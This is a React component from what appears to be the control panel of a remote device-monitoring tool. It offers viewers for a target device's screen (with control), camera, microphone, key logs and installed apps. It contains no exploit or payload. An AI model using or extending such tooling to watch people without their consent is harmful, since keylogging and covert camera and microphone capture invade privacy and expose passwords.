import React, { useState, useEffect } from "react";
import toast from "react-hot-toast";
import dynamic from "next/dynamic";

import FullscreenOutlinedIcon from "@mui/icons-material/FullscreenOutlined";
import ControlCameraOutlinedIcon from "@mui/icons-material/ControlCameraOutlined";
import SurroundSoundOutlinedIcon from "@mui/icons-material/SurroundSoundOutlined";
import KeyboardAltOutlinedIcon from "@mui/icons-material/KeyboardAltOutlined";
import AndroidOutlinedIcon from "@mui/icons-material/AndroidOutlined";
import SplitscreenOutlinedIcon from "@mui/icons-material/SplitscreenOutlined";

import { useAuth } from "src/hooks/use-auth";
import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useTranslation } from "react-i18next";
import FeaturesGroup from "../../components/featuresGroup";

import Color from "src/theme/colors";

const ScreenMonitorViewer = dynamic(() => import("../../components/monitorViewers/screen"), {
  ssr: false,
});
const ScreenMonitorSkeleton = dynamic(
  () => import("../../components/monitorViewers/screenSkeleton"),
  {
    ssr: false,
  }
);
const CameraMonitorViewer = dynamic(() => import("../../components/monitorViewers/camera"), {
  ssr: false,
});
const MicMonitorViewer = dynamic(() => import("../../components/monitorViewers/mic"), {
  ssr: false,
});
const KeyLogsMonitorViewer = dynamic(() => import("../../components/monitorViewers/keylogs"), {
  ssr: false,
});

export const DeviceMonitors = ({ device }) => {
  const { t } = useTranslation();
  const user = useAuth();

  const { onSocketCloseMonitor } = useSocketFunctions();

  const [loading, setLoading] = useState(false);
  const [viewerVisibility, setViewerVisibility] = useState({
    "screen-monitor": false,
    "screen-skeleton": false,
    "camera-monitor": false,
    "mic-monitor": false,
    "key-monitor": false,
  });

  useEffect(() => {
    init();
    let timeout;
    if (loading) {
      timeout = setTimeout(() => {
        setLoading(false);
        toast.error(t("toast.error.access-time-out"), {
          position: "bottom-center",
          reverseOrder: false,
          duration: 5000,
          style: {
            backgroundColor: Color.background.red_gray01,
            borderRadius: "5px",
            padding: "3px 10px",
          },
        });
      }, 30000);
    }
    return () => clearTimeout(timeout);
  }, [loading, t]);

  const init = async () => {
    await onSocketCloseMonitor("monitor-close", {
      deviceId: device.deviceId,
      type: "all",
    });
  };

  const onSelectedMonitor = async (monitor) => {
    try {
      setViewerVisibility((prev) => ({
        ...prev,
        [monitor.label]: true,
      }));
    } catch (error) {
      console.error("Monitor Selection Failed", error);
      setLoading(false);
    }
  };

  const handleCloseViewer = async (monitorLabel) => {
    try {
      console.log({ monitorLabel });
      await onSocketCloseMonitor("monitor-close", {
        deviceId: device.deviceId,
        type: monitorLabel,
      });
      setViewerVisibility((prev) => ({
        ...prev,
        [monitorLabel]: false,
      }));
    } catch (error) {
      console.error("close error", error);
    }
  };

  const monitors = [
    {
      label: "screen-monitor",
      icon: <FullscreenOutlinedIcon />,
      title: t("devicesPage.monitors.screenControl"),
    },
    {
      label: "screen-skeleton",
      icon: <SplitscreenOutlinedIcon />,
      title: t("devicesPage.monitors.screenSkeleton"),
    },
    {
      label: "camera-monitor",
      icon: <ControlCameraOutlinedIcon />,
      title: t("devicesPage.monitors.monitorCamera"),
    },
    {
      label: "mic-monitor",
      icon: <SurroundSoundOutlinedIcon />,
      title: t("devicesPage.monitors.monitorMicrophone"),
    },
    {
      label: "key-monitor",
      icon: <KeyboardAltOutlinedIcon />,
      title: t("devicesPage.monitors.keyRegister"),
    },
    {
      label: SocketIOPublicEvents.application_monitor,
      icon: <AndroidOutlinedIcon />,
      title: t("devicesPage.applications"),
    },
  ];

  return (
    <React.Fragment>
      <FeaturesGroup features={monitors} callback={onSelectedMonitor} />

      {viewerVisibility["screen-monitor"] && (
        <ScreenMonitorViewer
          monitor="screen-monitor"
          device={device}
          onClose={() => handleCloseViewer("screen-monitor")}
        />
      )}
      {viewerVisibility["screen-skeleton"] && (
        <ScreenMonitorSkeleton
          monitor="screen-skeleton"
          device={device}
          onClose={() => handleCloseViewer("screen-skeleton")}
        />
      )}
      {viewerVisibility["camera-monitor"] && (
        <CameraMonitorViewer
          monitor="camera-monitor"
          device={device}
          onClose={() => handleCloseViewer("camera-monitor")}
        />
      )}
      {viewerVisibility["mic-monitor"] && (
        <MicMonitorViewer
          monitor="mic-monitor"
          device={device}
          onClose={() => handleCloseViewer("mic-monitor")}
        />
      )}
      {viewerVisibility["key-monitor"] && (
        <KeyLogsMonitorViewer
          monitor="key-monitor"
          device={device}
          onClose={() => handleCloseViewer("key-monitor")}
        />
      )}
    </React.Fragment>
  );
};
